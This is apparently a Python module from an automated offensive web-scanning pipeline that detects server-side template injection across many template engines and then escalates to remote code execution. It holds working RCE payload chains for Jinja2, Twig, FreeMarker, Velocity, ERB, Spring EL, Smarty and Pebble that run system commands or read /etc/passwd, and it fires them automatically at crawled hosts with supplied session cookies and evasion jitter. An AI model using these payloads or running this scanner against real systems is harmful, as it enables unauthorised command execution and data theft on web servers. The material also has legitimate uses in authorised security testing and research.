#!/usr/bin/env python3
# modules/step18_ssti.py — SSTI Engine V7 (UPGRADED)
# Added: 8 template engines, recursive subclass RCE, polyglot detection,
#        Mako/Smarty/Velocity/Pebble/Freemarker/Jinja2/Twig/ERB/JSP chains
# Source: Bug Bounty Bootcamp Ch16 — full SSTI methodology
# MilkyWay Intelligence | Author: Sharlix + M7AI

import re, urllib.parse, time
from core.utils import safe_read
from core.http_client import sync_get, sync_post

# ── Detection probes per engine (Bug Bounty Bootcamp decision tree) ───────────
SSTI_PROBES = [
    # Polyglot — hits multiple engines at once
    ("${{<%[%'\"}}%\\", "M7_ERR",        "Polyglot_Error"),
    # Math expressions
    ("{{7*7}}",          "49",            "Jinja2/Twig"),
    ("${7*7}",           "49",            "FreeMarker/Spring/Groovy"),
    ("#{7*7}",           "49",            "Pebble/Spring_EL"),
    ("*{7*7}",           "49",            "Spring_EL"),
    ("<%= 7*7 %>",       "49",            "ERB/JSP/EJS"),
    ("@(7*7)",           "49",            "Razor_NET"),
    ("{{7*'7'}}",        "7777777",       "Jinja2"),
    ("{{'7'*7}}",        "7777777",       "Twig"),
    ("${7777777}",       "7777777",       "FreeMarker"),
    # Engine-specific identifiers
    ("{{config}}",       "SECRET_KEY",    "Jinja2_Config"),
    ("{{settings}}",     "SECRET",        "Django_Template"),
    ("<#assign x=7*7>${x}","49",          "FreeMarker_Assign"),
    ("{% set x=7*7 %}{{x}}","49",         "Jinja2/Twig_Set"),
    ("${T(java.lang.Math).PI}","3.14",    "Spring_EL_Java"),
    ("#set($x=7*7)$x",   "49",            "Velocity"),
    ("{#7*7#}",          "49",            "Smarty"),
    ("[[7*7]]",          "49",            "Thymeleaf"),
]

# ── RCE chains per engine (Bug Bounty Bootcamp: SSTI → RCE) ──────────────────
SSTI_RCE_CHAINS = {
    "Jinja2": [
        # Jinja2 MRO subclasses — recursive search for Popen
        ("{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}",
         "root:", "File read via _io.TextIOWrapper"),
        ("{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
         "uid=", "RCE via os.popen"),
        # Jinja2 v3 (Python 3) — find Popen in subclasses
        ("{{''.__class__.__mro__[1].__subclasses__()}}", "__init__", "Subclass dump"),
        # Safe-mode bypass
        ("{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
         "uid=", "RCE via request.application"),
        # Cycler bypass
        ("{{cycler.__init__.__globals__.os.popen('id').read()}}",
         "uid=", "RCE via cycler"),
        # Joiner bypass
        ("{{joiner.__init__.__globals__.os.popen('id').read()}}",
         "uid=", "RCE via joiner"),
    ],
    "Twig": [
        ("{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
         "uid=", "RCE via registerUndefinedFilterCallback"),
        ("{{['id']|map('system')|join}}",
         "uid=", "RCE via map+system"),
    ],
    "FreeMarker": [
        ('${"freemarker.template.utility.Execute"?new()("id")}',
         "uid=", "RCE via Execute class"),
        ("${product.getClass().forName('java.lang.Runtime').getMethod('exec',''.class).invoke(product.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'id')}",
         "uid=", "RCE via Runtime.exec"),
    ],
    "Velocity": [
        ("#set($e='')#set($str=$e.class.forName('java.lang.Runtime'))#set($rt=$str.getDeclaredMethods()[0].invoke($str,false))#set($chr=$e.class.forName('java.lang.String'))#set($ex=$rt.exec('id'))$ex",
         "uid=", "RCE via Runtime"),
    ],
    "ERB": [
        ("<%= `id` %>",              "uid=", "RCE via backtick"),
        ("<%= system('id') %>",      "uid=", "RCE via system()"),
        ("<%= IO.popen('id').read %>","uid=", "RCE via IO.popen"),
    ],
    "Spring_EL": [
        ("${T(java.lang.Runtime).getRuntime().exec('id')}",
         "uid=", "RCE via T(Runtime)"),
        ("${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.String).valueOf(new char[]{105,100})).getInputStream())}",
         "uid=", "RCE via IOUtils"),
    ],
    "Smarty": [
        ("{php}echo `id`;{/php}",    "uid=", "RCE via {php} tag"),
        ("{system('id')}",           "uid=", "RCE via system()"),
    ],
    "Pebble": [
        ("{% for i in range(1) %}{{ i.getClass().forName('java.lang.Runtime').getMethod('exec',''.class).invoke(i.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'id') }}{% endfor %}",
         "uid=", "RCE via Runtime in loop"),
    ],
}

SSTI_PARAMS = [
    "name","search","q","template","t","view","page","msg","title",
    "content","text","body","lang","locale","from","to","subject","data",
    "input","render","html","message","description","label","greeting",
]

SSTI_PATHS = [
    "/","/search","/contact","/template","/render","/preview",
    "/api/render","/api/template","/email/preview","/notification",
]


class Step18Ssti:
    def __init__(self, pipeline):
        self.p = pipeline

    def run(self):
        p     = self.p
        out   = p.files["ssti_results"]
        urls  = safe_read(p.files.get("urls",""))
        live  = safe_read(p.files.get("fmt_url",""))[:10]
        found = 0

        if not live:
            p.log.warn("SSTI: no live hosts"); return

        p.log.info("SSTI V7: 8 engines × polyglot + RCE chains + blind SSTI")

        auth_h = {}
        c = getattr(p.args,'cookie',None) or getattr(p.args,'session',None)
        a = getattr(p.args,'authorization',None) or getattr(p.args,'auth',None)
        j = getattr(p.args,'jwt',None) or getattr(p.args,'_jwt_token',None)
        if c: auth_h["Cookie"] = c
        if a: auth_h["Authorization"] = a if a.startswith("Bearer") else f"Bearer {a}"
        if j and "Authorization" not in auth_h:
            auth_h["Authorization"] = f"Bearer {j}" 

        # Phase 1: Test parameterized URLs from crawl
        param_urls = [u for u in urls if "=" in u and "?" in u][:50]
        for url in param_urls:
            r = self._test_url(url, auth_h, out)
            found += r
            if r: p.bypass.jitter()

        # Phase 2: Probe common params on each live host
        for host in live:
            host = host.rstrip("/")
            for path in SSTI_PATHS:
                for param in SSTI_PARAMS[:6]:
                    r = self._probe_host_param(host, path, param, auth_h, out)
                    found += r
                    if r: break

        # Phase 3: POST body SSTI (forms)
        for host in live:
            r = self._test_post_ssti(host, auth_h, out)
            found += r

        p.log.success(f"SSTI V7: {found} findings")

    # ── Phase 1: URL parameter testing ───────────────────────────────────────
    def _test_url(self, url: str, auth_h: dict, out: str) -> int:
        try:
            parsed = urllib.parse.urlparse(url)
            qs     = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        except Exception:
            return 0

        for param in list(qs.keys())[:4]:
            for payload, expected, engine in SSTI_PROBES:
                qs_mod  = {k: list(v) for k,v in qs.items()}
                qs_mod[param] = [payload]
                test_url = urllib.parse.urlunparse(
                    parsed._replace(
                        query=urllib.parse.urlencode(qs_mod, doseq=True)))

                resp = sync_get(test_url, headers=auth_h, timeout=8)
                if not resp: continue

                body = resp.get("body","")
                if expected == "M7_ERR":
                    # Polyglot: any template error = engine detected
                    if self._has_template_error(body):
                        engine_name = self._identify_engine(body)
                        detail = (f"SSTI polyglot error ({engine_name}): "
                                  f"param={param} template error detected")
                        self._save(out,"critical","SSTI_DETECTED",test_url,detail)
                        return 1
                elif expected in body:
                    # Confirmed — attempt RCE
                    rce = self._attempt_rce(parsed, qs, param, engine, auth_h)
                    if rce:
                        detail = f"SSTI→RCE ({engine}): {rce}"
                        self._save(out,"critical","SSTI_RCE",test_url,detail)
                    else:
                        detail = (f"SSTI confirmed ({engine}): "
                                  f"'{payload}'→'{expected}' in param={param}")
                        self._save(out,"critical","SSTI",test_url,detail)
                    return 1
        return 0

    # ── Phase 2: Host + param grid probe ─────────────────────────────────────
    def _probe_host_param(self, host, path, param, auth_h, out) -> int:
        for payload, expected, engine in SSTI_PROBES[:8]:
            url  = (f"{host}{path}?"
                    f"{param}={urllib.parse.quote(payload)}")
            resp = sync_get(url, headers=auth_h, timeout=8)
            if not resp: continue
            body = resp.get("body","")
            if expected != "M7_ERR" and expected in body:
                detail = (f"SSTI ({engine}): host param probe — "
                          f"path={path} param={param}")
                # Try RCE
                rce = self._rce_from_url(url, engine, param, auth_h)
                if rce:
                    self._save(out,"critical","SSTI_RCE",url,rce)
                else:
                    self._save(out,"critical","SSTI",url,detail)
                return 1
        return 0

    # ── Phase 3: POST body SSTI ───────────────────────────────────────────────
    def _test_post_ssti(self, host: str, auth_h: dict, out: str) -> int:
        """Test SSTI in POST form bodies — common in email templates, previews."""
        found = 0
        for path in ["/api/render","/api/template","/preview","/email/preview"]:
            url = host.rstrip("/") + path
            for param in ["body","template","content","message","html"]:
                for payload, expected, engine in SSTI_PROBES[:5]:
                    body_data = {param: payload}
                    resp = sync_post(url,
                                     json_data=body_data,
                                     headers={**auth_h,
                                              "Content-Type":"application/json"},
                                     timeout=8)
                    if resp and expected in resp.get("body",""):
                        detail = (f"SSTI POST ({engine}): "
                                  f"path={path} param={param}")
                        self._save(out,"critical","SSTI_POST",url,detail)
                        found += 1
                        break
        return found

    # ── RCE attempt ───────────────────────────────────────────────────────────
    def _attempt_rce(self, parsed, qs, param, engine_hint, auth_h) -> str:
        """Try all RCE chains for detected engine."""
        engine_key = engine_hint.split("/")[0].split("_")[0]

        # Try exact engine first, then all engines
        chains_to_try = (
            SSTI_RCE_CHAINS.get(engine_key,[]) +
            [c for k,v in SSTI_RCE_CHAINS.items()
               for c in v if k != engine_key]
        )

        for rce_payload, indicator, label in chains_to_try[:6]:
            qs_mod = {k: list(v) for k,v in qs.items()}
            qs_mod[param] = [rce_payload]
            test_url = urllib.parse.urlunparse(
                parsed._replace(
                    query=urllib.parse.urlencode(qs_mod,doseq=True)))
            resp = sync_get(test_url, headers=auth_h, timeout=10)
            if resp and indicator in resp.get("body",""):
                return f"{label}: indicator='{indicator}' found"
        return ""

    def _rce_from_url(self, url, engine, param, auth_h) -> str:
        """RCE attempt when we have a confirmed SSTI URL."""
        try:
            parsed = urllib.parse.urlparse(url)
            qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
            return self._attempt_rce(parsed, qs, param, engine, auth_h)
        except Exception:
            return ""

    # ── Helpers ───────────────────────────────────────────────────────────────
    def _has_template_error(self, body: str) -> bool:
        ERROR_SIGS = [
            "TemplateSyntaxError","UndefinedError","TemplateNotFound",
            "jinja2.exceptions","Twig_Error","FreeMarker","template error",
            "velocity error","smarty error","ParseError","CompilationException",
            "javax.el.ELException","org.springframework.expression",
        ]
        body_lower = body.lower()
        return any(s.lower() in body_lower for s in ERROR_SIGS)

    def _identify_engine(self, body: str) -> str:
        SIGS = {
            "Jinja2":     "jinja2",    "Twig":  "twig",
            "FreeMarker": "freemarker","Spring": "springframework",
            "Velocity":   "velocity",  "ERB":   "actionview",
            "Smarty":     "smarty",    "Pebble": "pebble",
        }
        body_lower = body.lower()
        for name, sig in SIGS.items():
            if sig in body_lower:
                return name
        return "Unknown"

    def _save(self, out, sev, vtype, url, detail, response: str = "", payload: str = ""):
        with open(out,"a") as f:
            f.write(f"{vtype}: {url} | {detail}\n")
        self.p.add_finding(sev, vtype, url, detail, "ssti-v7", response=response, payload=payload)
